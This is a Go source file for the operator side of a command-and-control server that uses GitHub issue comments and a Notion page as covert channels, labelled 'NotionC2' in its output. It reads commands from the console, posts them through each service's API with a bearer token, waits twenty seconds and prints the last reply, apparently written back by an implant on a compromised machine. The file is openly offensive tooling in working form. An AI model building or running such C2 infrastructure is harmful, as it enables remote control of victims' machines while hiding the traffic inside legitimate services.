package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"
)

type github struct {
	Access_token string            `json:"access_token"`
	UrlC         string            `json:"url_for_comment"`
	Accept       string            `json:"accept"`
	UrlI         string            `json:"url_for_issues"`
	TitleI       string            `json:"title_for_issues"`
	BodyC        map[string]string `json:"body_for_comments"`
	BodyI        map[string]string `json:"body_for_issues"`
	Repo_Name    string            `json:"repo_name"`
	Owner        string            `json:"owner"`
}

type notion struct {
	Integeration_Token string `json:"integeration_token"`
	Page_ID            string `json:page_id`
	Body               string `json:body`
	Url                string `json:url`
	UrlR               string `json:urlr`
}

func ForGithub() {
	//1. User create a repo, provide the access_token
	// repo name and owner name.
	obj := github{}
	obj.Owner = os.Args[1]
	obj.Repo_Name = os.Args[2]
	obj.Access_token = os.Args[3]

	fmt.Println(obj.Owner)
	fmt.Println(obj.Repo_Name)
	fmt.Println(obj.Access_token)

	obj.BodyI = map[string]string{
		"title": "API created Issue",
		"body":  "This issue is generated to solve API",
	}

	obj.UrlI = "https://api.github.com/repos/" + obj.Owner + "/" + obj.Repo_Name + "/issues"

	BodyI, _ := json.Marshal(obj.BodyI)

	//create issue
	req, _ := http.NewRequest("POST", obj.UrlI, bytes.NewBuffer(BodyI))
	req.Header.Add("Authorization", "Bearer "+obj.Access_token)
	req.Header.Add("Accept", "application/vnd.github+json")

	client := &http.Client{}

	fmt.Println("The request", req)

	response, err := client.Do(req)

	if err == nil {
		fmt.Println("[+] Successfully Created The issue.....")

	} else {
		fmt.Println("[-] Unsuccessful on creation of issue")
		fmt.Println(err)
		return
	}

	var body map[string]interface{}
	json.NewDecoder(response.Body).Decode(&body)
	fmt.Println("Comments URL : ", body["comments_url"])

	obj.UrlC = body["comments_url"].(string) //type assert -> when we are using interface we should do it.

	var end string = ""
	var output []map[string]interface{}

	reader := bufio.NewReader(os.Stdin)

	for end != "end" {
		fmt.Print("command> ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		//for sending the command
		obj.BodyC = map[string]string{
			"body": cmd,
		}
		BodyC, _ := json.Marshal(obj.BodyC)
		req2, _ := http.NewRequest("POST", obj.UrlC, bytes.NewBuffer(BodyC))
		req2.Header.Add("Authorization", "Bearer "+obj.Access_token)
		req2.Header.Add("Accept", "application/vnd.github+json")

		_, err2 := client.Do(req2)

		if err2 != nil {
			fmt.Println("[-] Error in Comment creation")
			fmt.Println(err2)
		} else {
			fmt.Println("[+] Command Sent")
		}

		fmt.Println("[-] Waiting to read the output......")
		time.Sleep(20 * time.Second)

		//for reading the output

		req3, _ := http.NewRequest("GET", obj.UrlC, nil)
		req3.Header.Add("Authorization", "Bearer "+obj.Access_token)
		req3.Header.Add("Accept", "application/vnd.github+json")

		response3, err3 := client.Do(req3)

		if err3 != nil {
			fmt.Println("[-] Error in reading the output")
			fmt.Println(err3)
			continue
		}

		body, _ := io.ReadAll(response3.Body)
		json.Unmarshal(body, &output)
		fmt.Println("[+] Command Output : ", output[len(output)-1]["body"])

		fmt.Print("Continue (end/quit): ")
		end, _ = reader.ReadString('\n')
		end = strings.TrimSpace(end)

	}
}

func ForNotion() {

	obj := notion{}
	obj.Integeration_Token = os.Args[1]
	obj.Page_ID = os.Args[2]
	obj.UrlR = "https://api.notion.com/v1/pages/" + obj.Page_ID
	var end string = ""
	obj.Url = "https://api.notion.com/v1/blocks/" + obj.Page_ID + "/children"
	var output map[string]interface{}

	fmt.Println("[+] NotionC2 Server Started!")

	reader := bufio.NewReader(os.Stdin)

	for end != "end" {
		fmt.Print("command> ")
		cmd, _ := reader.ReadString('\n')
		cmd = strings.TrimSpace(cmd)

		fmt.Println("Request Sent to :", obj.Url)

		payload := strings.NewReader(fmt.Sprintf(`{
			"children": [
				{
				"object": "block",
				"type": "paragraph",
				"paragraph": {
					"rich_text": [
					{
						"type": "text",
						"text": { "content": "%s" }
					}
					]
				}
				}
			]
			}`, cmd))

		req, _ := http.NewRequest("PATCH", obj.Url, payload)

		req.Header.Add("Notion-Version", "2022-06-28")
		req.Header.Add("Authorization", "Bearer "+obj.Integeration_Token)
		req.Header.Add("Content-Type", "application/json")

		_, err := http.DefaultClient.Do(req)

		if err != nil {
			fmt.Println("[-] Error in Writing Command")
		}

		fmt.Println("[!] Waiting to read result....")

		time.Sleep(20 * time.Second)

		//reading from notion

		req1, _ := http.NewRequest("GET", obj.Url, nil)

		req1.Header.Add("Notion-Version", "2022-06-28")
		req1.Header.Add("Authorization", "Bearer "+obj.Integeration_Token)

		res, err2 := http.DefaultClient.Do(req1)

		if err2 != nil {
			fmt.Println("[-] Error in reading from the notion page")
		}

		defer res.Body.Close()
		body, _ := io.ReadAll(res.Body)
		json.Unmarshal(body, &output)

		blocks := output["results"].([]interface{})
		block := blocks[len(blocks)-1].(map[string]interface{})
		if block["type"] == "paragraph" {
			paragraph := block["paragraph"].(map[string]interface{})
			rich := paragraph["rich_text"].([]interface{})
			//jsonData, _ := json.MarshalIndent(rich, "", "  ")
			//fmt.Println(string(jsonData))
			text := rich[0].(map[string]interface{})["text"].(map[string]interface{})["content"]
			fmt.Println(text)
		} else {
			fmt.Println("[-] Last block is not paragraph")
		}

		fmt.Print("Continue end/quit :")
		fmt.Scan(&end)

	}
}

func main() {
	//ForGithub()
	ForNotion()
}
